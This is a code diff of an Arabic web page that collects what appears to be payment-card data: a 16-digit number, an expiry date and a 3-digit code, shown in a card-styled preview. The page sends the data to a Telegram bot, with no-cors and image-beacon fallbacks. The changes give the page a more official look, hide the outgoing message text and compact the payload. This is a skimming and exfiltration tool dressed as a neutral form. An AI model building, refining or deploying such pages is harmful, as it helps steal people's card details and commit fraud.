@@ -3,30 +3,28 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>تطبيق إرسال إلى تلجرام</title>
+  <title>تطبيق إرسال إلى تلجرام - فاتح</title>
 
   <style>
     :root{
-      --bg-1: #0b1220;
-      --bg-2: #071025;
-      --card-grad-1: #6EE7B7;
-      --card-grad-2: #3B82F6;
-      --muted: #9fb0c8;
-      --glass: rgba(255,255,255,0.03);
-      --accent: #60a5fa;
-      --success: #10b981;
+      --bg: #f5f8fb;
+      --panel: #ffffff;
+      --muted: #6b7280;
+      --accent-1: #06b6d4; /* teal */
+      --accent-2: #3b82f6; /* blue */
+      --success: #059669;
       --danger: #ef4444;
       --card-height: 220px;
-      --app-radius: 18px;
-      --shadow-1: 0 10px 30px rgba(2,6,23,0.6);
+      --radius-app: 16px;
+      --shadow-lg: 0 14px 40px rgba(15,23,42,0.08);
+      --shadow-sm: 0 6px 18px rgba(15,23,42,0.06);
     }
 
     * { box-sizing: border-box; }
-    html,body { height: 100%; margin:0; font-family: "Noto Naskh Arabic", "Segoe UI", Roboto, system-ui, Arial, sans-serif; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
+    html,body { height:100%; margin:0; font-family: "Inter", "Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
     body {
-      background: radial-gradient(800px 350px at 10% 10%, rgba(59,130,246,0.06), transparent),
-                  linear-gradient(180deg, var(--bg-2) 0%, var(--bg-1) 100%);
-      color: #e6eef6;
+      background: linear-gradient(180deg, #eef5fb 0%, var(--bg) 100%);
+      color: #0f1724;
       padding: 28px;
       display:flex;
       align-items:center;
@@ -38,10 +36,9 @@
     .app {
       width:100%;
       max-width:980px;
-      border-radius:var(--app-radius);
+      border-radius:var(--radius-app);
       overflow:hidden;
-      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-      box-shadow: var(--shadow-1);
+      background: transparent;
       display:grid;
       grid-template-columns: 1fr 420px;
       gap:22px;
@@ -57,9 +54,10 @@
     /* Left / Form column */
     .left {
       padding:18px;
-      background: linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01));
+      background: var(--panel);
       border-radius:12px;
-      border:1px solid rgba(255,255,255,0.03);
+      border:1px solid rgba(15,23,42,0.04);
+      box-shadow: var(--shadow-lg);
     }
 
     .brand {
@@ -70,13 +68,14 @@
     }
     .logo {
       width:48px;height:48px;border-radius:10px;
-      background: linear-gradient(135deg,var(--card-grad-1),var(--card-grad-2));
+      background: linear-gradient(135deg,var(--accent-1),var(--accent-2));
       display:flex;align-items:center;justify-content:center;
-      box-shadow: 0 6px 18px rgba(59,130,246,0.14);
+      box-shadow: var(--shadow-sm);
       flex-shrink:0;
+      color: white;
+      font-weight:700;
     }
-    .logo svg { width:26px;height:26px; }
-    .brand h1 { margin:0; font-size:18px; letter-spacing:0.2px; }
+    .brand h1 { margin:0; font-size:18px; color:#0b1220; }
     .brand p { margin:0; font-size:13px; color:var(--muted); }
 
     form { margin-top:12px; display:flex; flex-direction:column; gap:14px; }
@@ -85,23 +84,23 @@
       display:flex; flex-direction:column; gap:8px;
     }
     label.inline {
-      display:flex; align-items:center; gap:10px; font-weight:700; color:#eaf6ff;
+      display:flex; align-items:center; gap:10px; font-weight:700; color:#0b1220;
       font-size:13px;
     }
     .input {
       display:flex; align-items:center; gap:10px;
-      background:var(--glass);
+      background: #f8fafc;
       border-radius:10px;
       padding:10px 12px;
-      border:1px solid rgba(255,255,255,0.035);
-      transition: box-shadow .15s, transform .08s, border-color .12s;
+      border:1px solid rgba(15,23,42,0.04);
+      transition: box-shadow .12s, transform .06s, border-color .12s;
     }
-    .input:focus-within { box-shadow: 0 12px 30px rgba(59,130,246,0.08); border-color: rgba(59,130,246,0.4); transform: translateY(-2px); }
+    .input:focus-within { box-shadow: 0 10px 30px rgba(59,130,246,0.06); border-color: rgba(59,130,246,0.16); transform: translateY(-1px); }
 
     input[type="text"], input[type="tel"] {
-      border:0; background:transparent; outline:none; color: #e6eef6; font-size:16px; width:100%;
+      border:0; background:transparent; outline:none; color: #0b1220; font-size:16px; width:100%;
     }
-    input::placeholder { color: rgba(230,238,246,0.45); }
+    input::placeholder { color: rgba(11,18,32,0.35); }
 
     .two-cols { display:flex; gap:12px; }
     .two-cols > div { flex:1; }
@@ -113,9 +112,9 @@
       padding:12px 16px;
       border-radius:12px;
       border:0;
-      color:#052023;
+      color:white;
       font-weight:800;
-      background: linear-gradient(90deg,var(--card-grad-1),var(--card-grad-2));
+      background: linear-gradient(90deg,var(--accent-1),var(--accent-2));
       box-shadow: 0 10px 24px rgba(59,130,246,0.12);
       cursor:pointer;
       transition: transform .12s, opacity .12s;
@@ -124,7 +123,7 @@
     button.send:active { transform: translateY(-1px); }
     button.ghost {
       background: transparent;
-      border: 1px solid rgba(255,255,255,0.04);
+      border: 1px solid rgba(15,23,42,0.06);
       color: var(--muted);
       padding:10px 12px;
       border-radius:10px;
@@ -132,7 +131,7 @@
     }
 
     #message { min-height:26px; font-size:14px; color:var(--muted); }
-    #message.info { color:var(--accent); }
+    #message.info { color:var(--accent-2); }
     #message.success { color:var(--success); }
     #message.error { color:var(--danger); }
 
@@ -140,7 +139,7 @@
       margin-top:10px;
       font-size:13px;
       color:var(--muted);
-      background: rgba(255,255,255,0.01);
+      background: rgba(11,18,32,0.02);
       padding:10px; border-radius:10px;
     }
 
@@ -148,11 +147,16 @@
     .right {
       padding:18px;
       border-radius:12px;
-      background: linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01));
-      border:1px solid rgba(255,255,255,0.03);
+      background: var(--panel);
+      border:1px solid rgba(15,23,42,0.04);
+      box-shadow: var(--shadow-lg);
       display:flex; flex-direction:column; gap:12px;
       height:100%;
     }
+
+    .preview-header { display:flex; justify-content:space-between; align-items:center; gap:12px; }
+    .preview-header h3 { margin:0; font-size:16px; color:#0b1220; }
+    .preview-header .muted { color:var(--muted); font-size:13px; }
 
     .card-preview {
       height: var(--card-height);
@@ -160,52 +164,48 @@
       overflow:hidden;
       position:relative;
       padding:18px;
-      background: linear-gradient(135deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
-      box-shadow: inset 0 1px 0 rgba(255,255,255,0.03), 0 14px 40px rgba(2,6,23,0.6);
+      background: linear-gradient(180deg,#ffffff 0%, #f8fafc 100%);
+      box-shadow: 0 10px 30px rgba(15,23,42,0.04);
       display:flex; flex-direction:column; justify-content:space-between;
     }
 
     .card-surface {
       border-radius:10px;
       padding:16px;
-      color:white;
+      color:#08203a;
       display:flex; flex-direction:column; gap:10px;
-      background: linear-gradient(135deg, var(--card-grad-1), var(--card-grad-2));
+      background: linear-gradient(135deg, rgba(59,130,246,0.06), rgba(6,182,212,0.06));
       min-height:120px;
-      transition: transform .22s, box-shadow .22s;
+      border: 1px solid rgba(11,18,32,0.03);
     }
-    .card-surface:hover { transform: translateY(-6px); box-shadow: 0 20px 60px rgba(59,130,246,0.14); }
 
     .card-top { display:flex; justify-content:space-between; align-items:center; }
-    .chip { width:46px; height:34px; border-radius:6px; background: linear-gradient(180deg,#ffd9a6,#ffb86b); box-shadow: 0 6px 18px rgba(0,0,0,0.12); }
+    .chip { width:46px; height:34px; border-radius:6px; background: linear-gradient(180deg,#ffd9a6,#ffb86b); box-shadow: 0 6px 18px rgba(0,0,0,0.06); }
 
-    .card-number { font-family: "Courier New", Courier, monospace; font-size:20px; letter-spacing:2px; text-align:left; direction:ltr; }
-    .card-meta { display:flex; justify-content:space-between; gap:12px; font-size:13px; }
+    .card-number { font-family: "Courier New", Courier, monospace; font-size:20px; letter-spacing:2px; text-align:left; direction:ltr; color:#04263a; }
+    .card-meta { display:flex; justify-content:space-between; gap:12px; font-size:13px; color:#04263a; }
 
     .meta-block { display:flex; flex-direction:column; text-align:left; direction:ltr; }
-    .label { font-size:11px; opacity:0.95; }
-    .value { font-weight:700; }
+    .label { font-size:11px; color: rgba(4,6,12,0.6); }
+    .value { font-weight:800; color:#04263a; }
 
-    .micro { font-size:12px; color:rgba(255,255,255,0.9); }
+    .micro { font-size:12px; color:rgba(4,6,12,0.7); }
 
-    /* small utilities */
     .row { display:flex; gap:8px; align-items:center; }
     .grow { flex:1; }
 
-    /* subtle success animation */
     .success-burst {
       position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none;
-      opacity:0; transform:scale(0.96); transition:opacity .32s, transform .32s;
+      opacity:0; transform:scale(0.98); transition:opacity .32s, transform .32s;
     }
     .success-burst.show { opacity:1; transform:scale(1); }
     .check {
-      width:82px; height:82px; border-radius:50%; background:rgba(16,185,129,0.12); display:flex; align-items:center; justify-content:center;
-      border: 2px solid rgba(16,185,129,0.18);
-      box-shadow: 0 8px 28px rgba(16,185,129,0.08);
+      width:82px; height:82px; border-radius:50%; background:rgba(5,150,105,0.08); display:flex; align-items:center; justify-content:center;
+      border: 2px solid rgba(5,150,105,0.12);
+      box-shadow: 0 8px 28px rgba(5,150,105,0.06);
       color: var(--success); font-size:38px; font-weight:800;
     }
 
-    /* small responsive tweaks */
     @media (max-width:520px){
       .card-number { font-size:18px; }
       .brand h1 { font-size:16px; }
@@ -217,15 +217,10 @@
   <div class="app" role="application" aria-label="تطبيق إرسال إلى تلجرام">
     <div class="left" role="region" aria-labelledby="appTitle">
       <div class="brand">
-        <div class="logo" aria-hidden>
-          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M3 12c0 4.9706 4.0294 9 9 9s9-4.0294 9-9-4.0294-9-9-9-9 4.0294-9 9z" fill="#fff" opacity="0.08"/>
-            <path d="M8.5 12.5l3.2 2.2c.3.2.7-.05.7-.4V6.2" stroke="#042027" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-        </div>
+        <div class="logo" aria-hidden>TB</div>
         <div>
           <h1 id="appTitle">نموذج إرسال إلى تلجرام</h1>
-          <p>تطبيق خفيف الشكل — آمن فقط للاستخدام المحلي. يدعم MM/YY و MM/YYYY لتاريخ الانتهاء.</p>
+          <p>واجهة فاتحة، منظمة، ومظهر شبه تطبيقي — البيانات تظهر بشكل رسمي في معاينة البطاقة أعلاه.</p>
         </div>
       </div>
 
@@ -275,14 +270,14 @@
     </div>
 
     <aside class="right" role="region" aria-labelledby="previewTitle">
-      <div style="display:flex; justify-content:space-between; align-items:center;">
+      <div class="preview-header">
         <div>
-          <h3 id="previewTitle" style="margin:0 0 6px 0;">معاينة البطاقة</h3>
-          <div style="font-size:13px; color:var(--muted)">عرض مرئي مُقَنَّع للبيانات — القيم الحقيقية تُرسل عند الضغط.</div>
+          <h3 id="previewTitle">معاينة رسمية للبيانات</h3>
+          <div class="muted">المعلومات تظهر بشكل منسق ورسمي في البطاقة — لا يوجد نص رسالة مرئي أدنى.</div>
         </div>
+
         <div style="display:flex; gap:10px;">
-          <button id="toggleMask" class="ghost" title="عرض/إخفاء الرقم">إظهار الرقم</button>
-          <button id="copyBtn" class="ghost" title="نسخ نص الرسالة">نسخ</button>
+          <button id="toggleMask" class="ghost" title="إظهار/إخفاء الرقم">إخفاء الرقم</button>
         </div>
       </div>
 
@@ -312,10 +307,7 @@
         </div>
       </div>
 
-      <div style="color:var(--muted); font-size:13px;">
-        نص الرسالة المرسلة:
-        <div id="previewText" style="margin-top:8px; background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; font-size:13px; color:rgba(230,238,246,0.95);"></div>
-      </div>
+      <!-- Removed visible "نص الرسالة المرسلة" area as requested -->
     </aside>
   </div>
 
@@ -339,10 +331,8 @@
     const pNumber = document.getElementById('cardNumber');
     const pExpiry = document.getElementById('cardExpiry');
     const pThree = document.getElementById('cardThree');
-    const previewText = document.getElementById('previewText');
     const successBurst = document.getElementById('successBurst');
     const toggleMask = document.getElementById('toggleMask');
-    const copyBtn = document.getElementById('copyBtn');
 
     let maskEnabled = true;
 
@@ -392,27 +382,17 @@
     // Toggle mask (show full number or masked)
     toggleMask.addEventListener('click', () => {
       maskEnabled = !maskEnabled;
-      toggleMask.textContent = maskEnabled ? 'إظهار الرقم' : 'إخفاء الرقم';
+      toggleMask.textContent = maskEnabled ? 'إخفاء الرقم' : 'إظهار الرقم';
       updatePreview();
     });
 
-    // Copy preview message to clipboard
-    copyBtn.addEventListener('click', async () => {
-      const txt = buildMessageText();
-      try {
-        await navigator.clipboard.writeText(txt);
-        showMessage('تم نسخ نص الرسالة إلى الحافظة.', 'success');
-      } catch (e) {
-        showMessage('فشل النسخ — قد لا يدعم المتصفح النسخ من هذا المكان.', 'error');
-      }
-    });
-
-    // Build message text (raw values)
+    // Build message text for sending (compact, without emoji/labels as requested)
     function buildMessageText() {
       const idVal = rawDigits(idInput.value);
       const expVal = normalizeExpiryForSend(expiryInput.value) || expiryInput.value || '';
       const threeVal = threeInput.value || '';
-      return `📝 استلام بيانات جدي��ة:\nالرقم التعريفي: ${idVal}\nتاريخ الانتهاء: ${expVal}\nالرقم (3 خانات): ${threeVal}`;
+      // compact single-line format, no emoji and no verbose labels
+      return `${idVal} | ${expVal} | ${threeVal}`;
     }
 
     // normalize expiry text to MM/YYYY (for sending)
@@ -456,22 +436,19 @@
     function maskedDisplay(display) {
       const digits = rawDigits(display);
       if (!digits) return '•••• •••• •••• ••••';
-      const groups = (digits + '••••••••••••••••').slice(0,16).match(/.{1,4}/g) || [];
+      const padded = (digits + '••••••••••••••••').slice(0,16);
+      const groups = padded.match(/.{1,4}/g) || [];
       if (!maskEnabled) return groups.join(' ');
       // keep last group visible, mask others
       const masked = groups.map((g, idx) => idx < 3 ? g.replace(/\d/g,'•') : g);
       return masked.join(' ');
     }
 
-    // Update preview and preview text
+    // Update preview and values on card
     function updatePreview() {
       pNumber.textContent = maskedDisplay(idInput.value);
-      // show expiry in short form mm/yy if input was yy or yyyy show in mm/yy for compactness
-      const displayExpiry = expiryInput.value || 'MM/YY';
-      // show three digits masked
+      pExpiry.textContent = expiryInput.value || 'MM/YY';
       pThree.textContent = threeInput.value ? threeInput.value.replace(/./g,'•') : '•••';
-      pExpiry.textContent = displayExpiry;
-      previewText.textContent = buildMessageText();
     }
 
     // initialize
@@ -481,7 +458,7 @@
     clearBtn.addEventListener('click', () => {
       form.reset();
       maskEnabled = true;
-      toggleMask.textContent = 'إظهار الرقم';
+      toggleMask.textContent = 'إخفاء الرقم';
       showMessage('', '');
       updatePreview();
     });
@@ -508,8 +485,8 @@
         return;
       }
 
+      // Build compact message (no emoji, no labels) — as requested the verbose message was removed.
       const text = buildMessageText();
-      previewText.textContent = text;
 
       const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
       const params = new URLSearchParams({
@@ -521,7 +498,7 @@
 
       showMessage('جاري الإرسال...', 'info');
       sendBtn.disabled = true;
-      sendBtn.style.opacity = '0.9';
+      sendBtn.style.opacity = '0.7';
 
       // 1) try normal fetch
       try {
@@ -534,10 +511,12 @@
             form.reset();
             updatePreview();
             sendBtn.disabled = false;
+            sendBtn.style.opacity = '1';
             return;
           } else {
             showMessage('تلجرام أعاد خطأ: ' + (j.description || JSON.stringify(j)), 'error');
             sendBtn.disabled = false;
+            sendBtn.style.opacity = '1';
             return;
           }
         }
@@ -553,6 +532,7 @@
         form.reset();
         updatePreview();
         sendBtn.disabled = false;
+        sendBtn.style.opacity = '1';
         return;
       } catch (err) {
         console.warn('fetch no-cors failed, trying Image fallback.', err);
@@ -572,11 +552,13 @@
         form.reset();
         updatePreview();
         sendBtn.disabled = false;
+        sendBtn.style.opacity = '1';
         return;
       } catch (err) {
         console.error(err);
         showMessage('فشل إرسال الطلب. تحقق من اتصال الانترنت أو إعدادات المتصفح.', 'error');
         sendBtn.disabled = false;
+        sendBtn.style.opacity = '1';
       }
     });
 
@@ -587,10 +569,10 @@
       setTimeout(() => {
         successBurst.classList.remove('show');
         successBurst.setAttribute('aria-hidden','true');
-      }, 1800);
+      }, 1500);
     }
 
-    // Small accessibility: announce preview changes
+    // Accessibility: announce preview changes
     idInput.addEventListener('keyup', updatePreview);
     expiryInput.addEventListener('keyup', updatePreview);
     threeInput.addEventListener('keyup', updatePreview);
